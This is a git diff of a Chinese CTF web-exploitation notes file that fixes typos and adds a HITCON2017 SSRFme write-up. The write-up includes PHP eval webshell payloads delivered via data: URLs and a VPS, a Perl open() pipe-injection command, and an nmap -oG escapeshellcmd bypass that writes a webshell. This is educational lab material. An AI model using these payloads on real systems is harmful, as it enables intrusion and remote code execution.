@@ -1980,7 +1980,7 @@ escapeshellcmd — shell 元字符转义
 
 1. 传入的参数是：`' <?php @eval($_POST["cmd"]);?> -oG eval.php '`
 经过escapeshellarg处理后变成了`''\'' <?php @eval($_POST["cmd"]);?> -oG aaa.php '\'' '`，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。
-1. 经过escapeshellcmd处理后变成`''\\'' \<\?php @eval\(\$_POST\["cmd"\]\)\;\?\> -oG aaa.php '\\'' '`，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：
+2. 经过escapeshellcmd处理后变成`''\\'' \<\?php @eval\(\$_POST\["cmd"\]\)\;\?\> -oG aaa.php '\\'' '`，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：
 最后执行的命令是`nmap -T5 -sT -Pn --host-timeout 2 -F -oG eval.php \ <?php @eval($_POST[cmd]);?> \\`，由于中间的\\被解释为\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。
 
 ### 网鼎杯2020朱雀组Nmap-同样的题目
@@ -2811,11 +2811,92 @@ payload:
 
 3. 到现在就清楚了，首先需要`param=flag.txt`,同时又要`action`中包含`sign`和`read`, 而在`geneSign`函数中`action=scan`,我们需要构造一个包含`read`的payload,再看`getSign`函数,`param`和`action`的顺序正好是`hashlib.md5(secert_key + param + action).hexdigest()`,所以可以`param=flag.txtread`,这样就等于`param=flag.txt`,`action=readscan`。
    
-   获取到`sign`后，bp抓包构造cookie以及param就能拿到flag，
+   获取到`sign`后，bp抓包伪造cookie以及param就能拿到flag，
 
    *注意*：cookie中`action=readscan`
 
-## [BJDCTF2020] EasySearch (SSII-Server-Side Includes Injection（服务端包含注入）)
+## HITCON2017 SSRFme
+
+1. 考点
+   - SSRF
+   - perl语言漏洞
+
+2. 代码审计
+
+    ```php
+    <?php
+    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        # explode 使用一个字符串分割另一个字符串,并以数组形式返回
+        $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+        $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];
+    }
+
+    echo $_SERVER["REMOTE_ADDR"];
+    # $sandbox 的值为 sanbox/(orangexx.xx.xx.xx md5加密后的值)
+    $sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]);
+    # 以$sandbox的值创建路径
+    @mkdir($sandbox);
+    # 进入路径
+    @chdir($sandbox);
+    # shell_exec 执行命令
+    # escapeshellarg 把字符串转码为可以在 shell 命令里使用的参数
+    # 
+    $data = shell_exec("GET " . escapeshellarg($_GET["url"]));
+    # 返回文件路径的信息 文件名可以通过GET["filename"]传参
+    $info = pathinfo($_GET["filename"]);
+    # basename($info["dirname"])
+    # basename 返回路径中的文件名部分
+    # $info["dirname"] 返回路径中的目录部分
+    # 将 xxx 字符串中的 .  替换成 ''
+    $dir  = str_replace(".", "", basename($info["dirname"]));
+    # 创建文件夹
+    @mkdir($dir);
+    # 进入文件夹
+    @chdir($dir);
+    # 写入文件
+    # 将$data 写入 basename($info["basename"] 文件中
+    @file_put_contents(basename($info["basename"]), $data);
+    highlight_file(__FILE__);
+    ```
+
+3. 解题
+
+    **方法一--传木马用蚁剑连接**
+
+    1. SSRF配合PHP伪协议
+
+        payload:
+        ```php
+        ?url=data:text/plain,<?php%20@eval($_POST["cmd"]);?>&filename=aaa/aaa.php
+        ```
+    2. 服务器传马
+
+        在vps上绑定一句话木马进行监听，然后通过GET命令去请求，用$_GET[“filename”]传入的值作为文件名保存。
+
+        服务器上写马，用python启动一个http服务
+        ```python
+        python3 -m http.server
+        ```
+        payload:
+        ```php
+        ?url=xx.xx.xx.xx:port/xxx.php&filename=xxx.php
+        ```
+    木马上传完成以后去存放木马的路径访问，然后用蚁剑连接，直接访问文件拿不到flag。用蚁剑打开虚拟终端，在命令行执行`./readflag`
+
+    **方法二--perl语言漏洞**
+
+    因为GET函数在底层调用了perl语言中的open函数，但是该函数存在rce漏洞。当open函数要打开的文件名中存在管道符（并且系统中存在该文件名），就会中断原有打开文件操作，并且把这个文件名当作一个命令来执行。
+
+    1. 先创建文件
+        ```url
+        ?url=&filename=|/readflag
+        ```
+    2. 执行命令
+        ```url
+        ?url=file:|readflag&filename=a
+        ```
+
+## [BJDCTF2020] EasySearch (SSI-Server-Side Includes Injection（服务端包含注入）)
 
 1. 进入靶场之后用bp的Intruder尝试过爆破，但是没有什么效果。然后考虑**目录扫描**，会得到一个`index.php.swp`,这是一个备份文件，这种备份文件产的原因主要是线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。
 
@@ -3065,7 +3146,7 @@ url解码之后就是 `?code=phpinfo();`
 
         如果上面的payload不能用，可以在`suctf.cc`后加`../../../../../`尝试，多了没问题，少了不行。
 
-## 攻防世界 very_easy_sql(gopher+ssrf+sqli)
+## 攻防世界 very_easy_sql(gopher+sqli)
 
 1. gopher 协议
 
